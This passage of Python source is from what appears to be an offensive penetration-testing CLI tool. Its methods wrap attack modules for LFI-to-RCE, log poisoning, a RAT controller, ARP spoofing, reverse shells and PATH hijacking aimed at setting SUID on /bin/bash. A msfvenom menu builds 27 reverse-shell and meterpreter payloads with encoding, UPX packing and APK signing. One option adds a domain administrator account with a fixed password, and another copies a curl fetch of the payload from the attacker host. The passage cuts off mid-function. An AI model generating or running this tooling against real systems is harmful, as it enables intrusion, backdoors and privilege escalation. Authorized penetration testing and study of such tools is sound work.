        2. Checks if all required parameters are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazylfi2rce.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host.
        :type rhost: str
        :param rport: The port number of the remote host.
        :type rport: int
        :param lhost: The IP address of the local host.
        :type lhost: str
        :param lport: The port number of the local host.
        :type lport: int
        :param field: The field name for the LFI attack.
        :type field: str
        :param wordlist: The path to the wordlist file.
        :type wordlist: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` are assign in `self.params`.
        2. The script `modules/legacy/lazylfi2rce.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazylfi2rce.py --rhost <rhost> --rport <rport> --lhost <lhost> --lport <lport> --field <field> --wordlist <wordlist>`

        Example:
            To run the lazylfi2rce with `rhost` assign to `192.168.1.1`, `rport` assign to `80`, `lhost` assign to `192.168.1.2`, `lport` assign to `8080`, `field` assign to `file`, and `wordlist` assign to `path/to/wordlist.txt`, set:
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["rport"] = 80`
            `self.params["lhost"] = "192.168.1.2"`
            `self.params["lport"] = 8080`
            `self.params["field"] = "file"`
            `self.params["wordlist"] = "path/to/wordlist.txt"`
            Then call:
            `run_lazylfi2rce()`

        Note:
            - Ensure that `modules/legacy/lazylfi2rce.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print_error("rhost and rport field and lhost lport wordlist must be assign")
            return
        self.run_script(
            "modules/legacy/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        """
        Run the internal module located at `modules/legacy/lazylogpoisoning.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `lhost`: The IP address of the local host, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost` and `lhost` from `self.params`.
        2. Checks if the required parameters `rhost` and `lhost` are assign. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazylogpoisoning.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host. Must be assign in `self.params`.
        :type rhost: str
        :param lhost: The IP address of the local host. Must be assign in `self.params`.
        :type lhost: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost` and `lhost` are assign in `self.params`.
        2. The script `modules/legacy/lazylogpoisoning.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazylogpoisoning.py --rhost <rhost> --lhost <lhost>`

        Example:
            To run the lazylogpoisoning with `rhost` assign to `192.168.1.1` and `lhost` assign to `192.168.1.2`, set:
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["lhost"] = "192.168.1.2"`
            Then call:
            `run_lazylogpoisoning()`

        Note:
            - Ensure that `modules/legacy/lazylogpoisoning.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print_error("rhost and lhost must be assign")
            return
        self.cmd(f"python3 modules/legacy/lazylogpoisoning.py --rhost {rhost} --lhost {lhost}")

    def run_lazybotcli(self):
        """
        Run the internal module located at `modules/legacy/lazybotcli.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host (default is `"0.0.0.0"`).
        - `rport`: The port number to be used, specified in `self.params`.
        - `rat_key`: The key for the Remote Access Tool (RAT), specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rport` and `rat_key` from `self.params`.
        2. Checks if the required parameters `rport` and `rat_key` are assign. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazybotcli.py` script with the appropriate arguments.

        :param rport: The port number for the connection. Must be assign in `self.params`.
        :type rport: int
        :param rat_key: The key for the RAT. Must be assign in `self.params`.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rport` and `rat_key` are assign in `self.params`.
        2. The script `modules/legacy/lazybotcli.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazybotcli.py --host 0.0.0.0 --port <rport> --key <rat_key>`

        Example:
            To run the lazybotcli with port `12345` and key `mysecretkey`, set:
            `self.params["rport"] = 12345`
            `self.params["rat_key"] = "mysecretkey"`
            Then call:
            `run_lazybotcli()`

        Note:
            - Ensure that `modules/legacy/lazybotcli.py` has the appropriate permissions and dependencies to run.
        """

        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/legacy/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyssh77enum(self):
        """
        Run the internal module located at `modules/lazybrutesshuserenum.py` with the specified parameters. ONLY valid for 7.x Version !!!

        The script will be executed with the following arguments:

        - `wordlist`: The path to the wordlist file containing potential usernames for SSH enumeration.
        - `rhost`: The target IP address or hostname for SSH enumeration.

        The function performs the following steps:

        1. Retrieves the values for `wordlist` and `rhost` from `self.params`.
        2. Prints a warning message about the potential inaccuracy of the results.
        3. Constructs the command to run the `lazybrutesshuserenum.sh` script with the specified arguments.
        4. Executes the command using the `os.system` method.

        :param wordlist: The path to the wordlist file for username enumeration. Must be assign in `self.params`.
        :type wordlist: str
        :param rhost: The target IP address or hostname for SSH enumeration. Must be assign in `self.params`.
        :type rhost: str

        :returns: None

        Manual execution:
        1. Ensure that `wordlist` and `rhost` are assign in `self.params`.
        2. Run the script `modules/lazybrutesshuserenum.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazybrutesshuserenum.sh` must be present in the `modules` directory and must be executable.

        Example:
            To run the SSH user enumeration with a wordlist located at `/path/to/wordlist.txt` and target IP `192.168.1.1`, set:
            `self.params["usrwordlist"] = "/path/to/wordlist.txt"`
            `self.params["rhost"] = "192.168.1.1"`
            Then call:
            `run_lazyssh77enum()`

        Note:
            - The accuracy of the results may vary depending on the version of the script and the wordlist used.
        """

        wordlist = self.params["usrwordlist"]
        rhost = self.params["rhost"]
        if not wordlist or not rhost:
            print_error("rhost and wordlist must be assign")
            return
        print_warn(
            "this may not be accurate. using a version a little bit updated from searchsploit"
        )
        path = os.getcwd()
        self.cmd(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")

    def run_lazyburpfuzzer(self):
        """
        Run the internal module located at `modules/lazyown_burpfuzzer.py` with the specified parameters.

        The script will be executed with the following arguments:

        - `--url`: The target URL for the fuzzer.
        - `--method`: The HTTP method to use (e.g., GET, POST).
        - `--proxy_port`: The port for the proxy server.
        - `--headers`: Optional HTTP headers to include in the request.
        - `--data`: Optional data to include in the request body.
        - `--params`: Optional URL parameters to include in the request.
        - `--json_data`: Optional JSON data to include in the request body.
        - `-w`: Optional wordlist for fuzzing.
        - `-hc`: Optional hide code for fuzzing.

        The function performs the following steps:

        1. Retrieves the values for `url`, `method`, `headers`, `params`, `data`, `json_data`, `proxy_port`, `wordlist`, and `hide_code` from `self.params`.
        2. Constructs the command to run the `lazyown_burpfuzzer.py` script with the specified arguments.
        3. Adds optional parameters based on whether the corresponding files (`headers_file`, `data_file`, `params_file`, `json_data_file`) are provided.
        4. Executes the command using the `run_command` method.

        :param url: The target URL for the fuzzer. Must be assign in `self.params`.
        :type url: str
        :param method: The HTTP method to use. Must be assign in `self.params`.
        :type method: str
        :param headers: Optional HTTP headers. Must be assign in `self.params` or provided via `headers_file`.
        :type headers: str
        :param params: Optional URL parameters. Must be assign in `self.params` or provided via `params_file`.
        :type params: str
        :param data: Optional data for the request body. Must be assign in `self.params` or provided via `data_file`.
        :type data: str
        :param json_data: Optional JSON data for the request body. Must be assign in `self.params` or provided via `json_data_file`.
        :type json_data: str
        :param proxy_port: The port for the proxy server. Must be assign in `self.params`.
        :type proxy_port: int
        :param wordlist: Optional wordlist for fuzzing. Must be assign in `self.params`.
        :type wordlist: str
        :param hide_code: Optional code to hide. Must be assign in `self.params`.
        :type hide_code: int
        :param headers_file: Optional file containing headers.
        :type headers_file: str, optional
        :param data_file: Optional file containing data.
        :type data_file: str, optional
        :param params_file: Optional file containing parameters.
        :type params_file: str, optional
        :param json_data_file: Optional file containing JSON data.
        :type json_data_file: str, optional

        :returns: None

        Manual execution:
        1. Ensure that `url`, `method`, and `proxy_port` are assign in `self.params`.
        2. Provide additional parameters as needed.
        3. Run the script `modules/lazyown_burpfuzzer.py` with the appropriate arguments.

        Dependencies:
        - `modules/lazyown_burpfuzzer.py` must be present in the `modules` directory and must be executable.

        Example:
            To run the fuzzer with URL `http://example.com`, HTTP method `POST`, and proxy port `8080`, set:
            `self.params["url"] = "http://example.com"`
            `self.params["method"] = "POST"`
            `self.params["proxy_port"] = 8080`
            Then call:
            `run_lazyburpfuzzer()`

        Note:
            - Ensure that all required parameters are assign before calling this function.
            - Parameters can also be provided via corresponding files.
        """

        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)
        return

    def run_lazyreverse_shell(self):
        """
        Run the internal module located at `modules/lazyreverse_shell.sh` with the specified parameters.

        The script will be executed with the following arguments:
        - `--ip`: The IP address to use for the reverse shell.
        - `--puerto`: The port to use for the reverse shell.

        The function performs the following steps:

        1. Retrieves the values for `rhost` (IP address) and `reverse_shell_port` (port) from `self.params`.
        2. Validates that `rhost` and `reverse_shell_port` parameters are assign.
        3. Constructs the command to run the `lazyreverse_shell.sh` script with the specified arguments.
        4. Executes the command.

        :param ip: The IP address to use for the reverse shell. Must be assign in `self.params`.
        :type ip: str
        :param port: The port to use for the reverse shell. Must be assign in `self.params`.
        :type port: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost` and `reverse_shell_port` are assign in `self.params`.
        2. Run the script `modules/lazyreverse_shell.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazyreverse_shell.sh` must be present in the `modules` directory and must be executable.

        Example:
            To assign up a reverse shell with IP `192.168.1.100` and port `4444`, assign:
            `self.params["rhost"] = "192.168.1.100"`
            `self.params["reverse_shell_port"] = "4444"`
            Then call:
            `run_lazyreverse_shell()`

        Note:
            - Ensure that `modules/lazyreverse_shell.sh` has the necessary permissions to execute.
            - Parameters must be assign before calling this function.
        """

        ip = self.params["rhost"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print_error(
                "rhost and reverse_shell_port must be assign, more info see, help assign"
            )
            return
        self.cmd(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")
        return

    def run_lazyarpspoofing(self):
        """
        Run the internal module located at `modules/legacy/lazyarpspoofing.py` with the specified parameters.

        The script will be executed with the following arguments:
        - `--device`: The network interface to use for ARP spoofing.
        - `lhost`: The local host IP address to spoof.
        - `rhost`: The remote host IP address to spoof.

        The function performs the following steps:

        1. Retrieves the values for `lhost`, `rhost`, and `device` from `self.params`.
        2. Validates that `lhost`, `rhost`, and `device` parameters are assign.
        3. Constructs the command to run the `lazyarpspoofing.py` script with the specified arguments.
        4. Executes the command.

        :param lhost: The local host IP address to spoof. Must be assign in `self.params`.
        :type lhost: str
        :param rhost: The remote host IP address to spoof. Must be assign in `self.params`.
        :type rhost: str
        :param device: The network interface to use for ARP spoofing. Must be assign in `self.params`.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `rhost`, and `device` are assign in `self.params`.
        2. Run the script `modules/legacy/lazyarpspoofing.py` with the appropriate arguments.

        Dependencies:
        - `modules/legacy/lazyarpspoofing.py` must be present in the `modules` directory and must be executable.

        Example:
            To execute ARP spoofing with local host `192.168.1.2`, remote host `192.168.1.1`, and device `eth0`, set:
            `self.params["lhost"] = "192.168.1.2"`
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazyarpspoofing()`

        Note:
            - Ensure that `modules/legacy/lazyarpspoofing.py` has the necessary permissions to execute.
            - Parameters must be assign before calling this function.
        """

        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print_error("lhost, lhost, and device must be assign")
            return
        self.cmd(f"modules/legacy/lazyarpspoofing.py --device {device} {lhost} {rhost}")
        return

    def run_lazyattack(self):
        """
        Run the internal module located at `modules/lazyatack.sh` with the specified parameters.

        The script will be executed with the following arguments:
        - `--modo`: The mode of the attack.
        - `--ip`: The target IP address.
        - `--atacante`: The attacker IP address.

        The function performs the following steps:

        1. Retrieves the current working directory.
        2. Validates that `mode`, `rhost`, and `lhost` parameters are assign.
        3. Constructs the command to run the `lazyatack.sh` script with the specified arguments.
        4. Executes the command.

        :param mode: The mode in which the attack should be run. Must be assign in `self.params`.
        :type mode: str
        :param target_ip: The IP address of the target. Must be assign in `self.params`.
        :type target_ip: str
        :param attacker_ip: The IP address of the attacker. Must be assign in `self.params`.
        :type attacker_ip: str

        :returns: None

        Manual execution:
        1. Ensure that `mode`, `rhost`, and `lhost` are assign in `self.params`.
        2. Run the script `modules/lazyatack.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazyatack.sh` must be present in the `modules` directory and must be executable.

        Example:
            To execute the attack with mode `scan`, target IP `192.168.1.100`, and attacker IP `192.168.1.1`, assign:
            `self.params["mode"] = "scan"`
            `self.params["rhost"] = "192.168.1.100"`
            `self.params["lhost"] = "192.168.1.1"`
            Then call:
            `run_lazyattack()`

        Note:
            - Ensure that `modules/lazyatack.sh` has the necessary permissions to execute.
            - Parameters must be assign before calling this function.
        """

        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["rhost"]
        attacker_ip = self.params["lhost"]
        if not mode or not target_ip or not attacker_ip:
            print_error("mode, rhost, and lhost must be assign, more info see help assign")
            return
        self.cmd(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )
        return

    def run_lazymsfvenom(self):
        """
        Executes the `msfvenom` tool to generate a variety of payloads based on user input.

        This function prompts the user to select a payload type from a predefined list and runs the corresponding
        `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
        payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

        The generated payloads are moved to a `sessions` directory, where appropriate permissions are assign. Additionally,
        the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
        the function will also sign the APK and perform necessary post-processing steps.

        :param line: Command line arguments for the script.
        :return: None
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lhost or not lport:
            print_error("lport and lhost must be assign")
            return

        # Prompt user for choice
        print_msg("Select payload type:")
        print_msg("1: linux/x86/meterpreter/reverse_tcp")
        print_msg("2: linux/x64/meterpreter/reverse_tcp")
        print_msg("3: windows/meterpreter/reverse_tcp")
        print_msg("4: windows/x64/meterpreter/reverse_tcp")
        print_msg("5: osx/x86/meterpreter/reverse_tcp")
        print_msg("6: osx/x64/meterpreter/reverse_tcp")
        print_msg("7: linux/x86/shell_reverse_tcp")
        print_msg("8: linux/x64/shell_reverse_tcp")
        print_msg("9: windows/shell_reverse_tcp")
        print_msg("10: windows/x64/shell_reverse_tcp")
        print_msg("11: osx/x86/shell_reverse_tcp")
        print_msg("12: osx/x64/shell_reverse_tcp")
        print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
        print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
        print_msg("15: android/meterpreter/reverse_tcp")
        print_msg("16: java/jsp_shell_reverse_tcp")
        print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
        print_msg("18: windows/x64/exec cmd='net user administrator P@s5w0rd123!'")
        print_msg("19: windows/shell_reverse_tcp python shellcode")
        print_msg("20: windows/x64/shell_reverse_tcp msi")
        print_msg("21: windows/meterpreter/reverse_tcp Powershell")
        print_msg("22: windows/meterpreter/reverse_tcp enc dll")
        print_msg("23: windows/shell_reverse_tcp HTA file")
        print_msg("24: windows/shell_reverse_tcp CSharp Shellcode")
        print_msg("25: windows/shell_reverse_tcp Perl Shellcode Windows")
        print_msg("26: linux/x64/shell_reverse_tcp Perl Shellcode Linux")
        print_msg("27: linux/x64/shell_reverse_tcp python shellcode")
        choice = input("Enter your choice (1-27): ").strip()

        # Define payload commands
        commands = {
            "1": f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "2": f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "3": f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "4": f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "5": f'msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "6": f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "7": f'msfvenom -p linux/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "8": f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "9": f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "10": f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "11": f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "12": f'msfvenom -p osx/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "13": (
                f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
            ),
            "14": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
            ),
            "15": f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} > sessions/shell.apk ',
            "16": f'msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -o sessions/shell.jsp ',
            "17": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
            ),
            "18": (
                "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"
            ),
            "19": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_windows.py'
            ),
            "20": (
                f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi'
            ),
            "21": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f psh > sessions/Shell.ps1'
            ),
            "22": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" --encrypt rc4 --encrypt-key thisisakey -f dll > sessions/Shell.dll'
            ),
            "23": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f hta-psh > sessions/index.hta'
            ),
            "24": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f csharp > sessions/shellcode.cs'
            ),
            "25": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f perl > sessions/shellcode_windows.pl'
            ),
            "26": (
                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f perl > sessions/shellcode_linux.pl'
            ),
            "27": (
                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_linux.py'
            )
        }
        if choice in commands:
            if choice == '14':
                self.cmd(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
                print_warn("esperando payload shell.exe ")
                time.sleep(15)
                print_warn("codificando payload shell_encoded.exe ")
            self.cmd(commands[choice])
            self.cmd(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
            self.cmd(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o sessions/rev.bin')
            print_msg(f"Generated payload: {commands[choice]}")
            if choice == '15':
                self.cmd("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
                if not is_binary_present("jarsigner"):
                    print_warn("jarsigner is not present in the system, installing...")
                    self.cmd("sudo apt-get install openjdk-11-jdk-headless")
                self.cmd("sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore sessions/shell.apk emi")
                self.cmd("sudo jarsigner -verify -verbose -certs sessions/shell.apk")
                if not is_binary_present("zipalign"):
                    print_warn("zipalign is not presetn in the system, installing...")
                    self.cmd("sudo apt-get install zipalign")
                self.cmd("zipalign -v 4 sessions/shell.apk sessions/signed_shell.apk")

            if choice in commands:
                self.cmd("mkdir -p sessions")
                self.cmd("mv shell* sessions 2>/dev/null")
                self.cmd("mv da.dll sessions 2>/dev/null")
                self.cmd("chmod +x sessions/shell*")
            print_msg("Payloads moved to sessions/")
            if choice in ["1", "2", "7", "8"]:
                if os.path.exists("sessions/shell.elf"):
                    self.cmd("upx sessions/shell.elf")
                if os.path.exists("sessions/shell64.elf"):
                    self.cmd("upx sessions/shell64.elf")
            if choice in ["3", "4", "9", "10", "14","20"]:
                if os.path.exists("sessions/shell.exe"):
                    self.cmd("upx sessions/shell.exe")
                if os.path.exists("sessions/shell64.exe"):
                    self.cmd("upx sessions/shell64.exe")
                if os.path.exists("sessions/shell64_encoded.exe"):
                    self.cmd("upx sessions/shell64_encoded.exe")
                if os.path.exists("sessions/shell64.ms"):
                    self.cmd("upx sessions/shell64.ms")
            if choice in ["5", "6", "11", "12"]:
                if os.path.exists("sessions/shell.macho"):
                    self.cmd("upx sessions/shell.macho")
                if os.path.exists("sessions/shell64.macho"):
                    self.cmd("upx sessions/shell64.macho")
            if choice == "13":
                if os.path.exists("sessions/payload.c"):
                    print_msg("Payload in C generated: payload.c")
                    self.cmd(
                        f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
                    )
                    print_msg(
                        f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard"
                    )

        else:
            print_error("Invalid choice. Please select a number between 1 and 26.")

    def run_lazyaslrcheck(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack. It should be assign in `self.params` before calling this method.
        :type binary_name: str

        :returns: None

        Manual execution:
        1. Ensure that `binary_name` is assign in `self.params`.
        2. Append the binary name to `modules/tmp.sh`.
        3. Copy `modules/tmp.sh` to `/tmp/{binary_name}`.
        4. assign executable permissions on the copied file.
        5. Update the PATH environment variable to prioritize `/tmp`.

        Dependencies:
        - The `self.params` dictionary must contain a valid `binary_name`.
        - Ensure that `modules/tmp.sh` exists and contains appropriate content for the attack.

        Example:
            To execute the path hijacking attack with `binary_name` as `malicious`, ensure `self.params["binary_name"]` is assign to `"malicious"`, and then call:
            `run_lazypathhijacking()`

        Note:
            - The `binary_name` parameter must be a string representing the name of the binary to hijack.
            - The method modifies the PATH environment variable, which may affect the execution of other binaries.
        """


        print_msg(
            f"{GREEN}Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}"
        )
        result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
        print_msg(result)
        if result == "0":
            print_error(f"    {GREEN}[+] ASLR is {RED}deactivated{RESET}")
        elif result == "1":
            print_warn(f"    {GREEN}[+] ASLR is partial {YELLOW}activated{RESET}")
        elif result == "2":
            print_msg(f"    {GREEN}[+] ASLR is activated{RESET}")
        return

    def run_lazypathhijacking(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack.
        :returns: None
        """

        binary_name = self.params["binary_name"]
        if not binary_name:
            print_msg("binary_name must be assign")
            return

        self.cmd(f"echo {binary_name} >> modules/tmp.sh")
        self.cmd(f"cp modules/tmp.sh /tmp/{binary_name}")
        self.cmd(f"chmod +x /tmp/{binary_name}")
        self.cmd("export PATH=/tmp:$PATH")

        print_msg(f"echo {binary_name} >> modules/tmp.sh")
        print_msg(f"cp modules/tmp.sh /tmp/{binary_name}")
        print_msg(f"chmod +x /tmp/{binary_name}")
        print_msg("export PATH=/tmp:$PATH")

        print_msg(
            f"Lazy path hijacking with binary_name: {binary_name} to assign u+s to /bin/bash"
        )
        return

    def run_script(self, script_name, *args):
        """Run a script with the given arguments

        This method constructs and executes a command to run a Python script with the specified arguments. It uses the `run_command` method to execute the script and handle real-time output.

        :param script_name: The name of the script to be executed.
        :type script_name: str
        :param args: The arguments to be passed to the script.
        :type args: tuple of str

        :returns: None

        Manual execution:
        1. Build the command list with "python3", the script name, and the arguments.
        2. Call `run_command` with the constructed command list.

        Dependencies:
        - `run_command` method for executing the constructed command and streaming output.

        Example:
            To execute a script named `example.py` with arguments `arg1` and `arg2`, call:
            `run_script("example.py", "arg1", "arg2")`

        Note:
            - The `script_name` parameter should be a string representing the name of the script.
            - The `args` parameter is a variable-length argument list containing the arguments to be passed to the script.
            - Ensure that the script and arguments are properly specified.
        """

        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time

        This method executes a given command using `subprocess.Popen` and streams both the standard output and standard error to the console in real-time. The output from both streams is appended to the `self.output` attribute. If interrupted, the process is terminated gracefully.

        :param command: The command to be executed.
        :type command: str

        :returns: None

        Manual execution:
        1. Execute the command specified by the `command` parameter.
        2. Stream and print the command's standard output and error to the console in real-time.
        3. Append all output to the `self.output` attribute.
        4. Handle `KeyboardInterrupt` by terminating the process and printing an error message.

        Dependencies:
        - `subprocess` module for running the command and capturing output.
        - `print_msg` function for printing output to the console.
        - `print_error` function for printing error messages to the console.

        Example:
            To execute a command, call `run_command("ls -l")`.

        Note:
            - The `command` parameter should be a string representing the command to be executed.
            - `self.output` must be initialized before calling this method.
            - Ensure proper exception handling to manage process interruptions.
        """

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line
                print_msg(line)
            for line in iter(process.stderr.readline, ""):
                self.output += line
                print_msg(line)
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print_error("[Interrupted] Process terminated")

    @cmd2.with_category(miscellaneous_category)

    def _render_chain_next(self, raw_args: str) -> None:
        """Render the chain's ``next`` view for the supplied verb (helper).

        Args:
            raw_args: The raw argument string passed to ``do_next``.
                Format: ``<verb> [limit]``.

        Returns:
            None.
        """
        from cli.command_chain import CommandChain
        tokens = raw_args.split()
        limit: int | None = None
        if tokens and tokens[-1].isdigit():
            limit = int(tokens[-1])
            tokens = tokens[:-1]
        if not tokens:
            print_warn("Pass a verb, e.g. `next lazynmap`.")
            return
        verb = tokens[0]
        chain = CommandChain()
        target = self.params.get("rhost") or None
        phase = (self.params.get("phase") or "").strip()
        steps = chain.next(
            cmd=verb, params=self.params, target=target, phase=phase, limit=limit
        )
        if not steps:
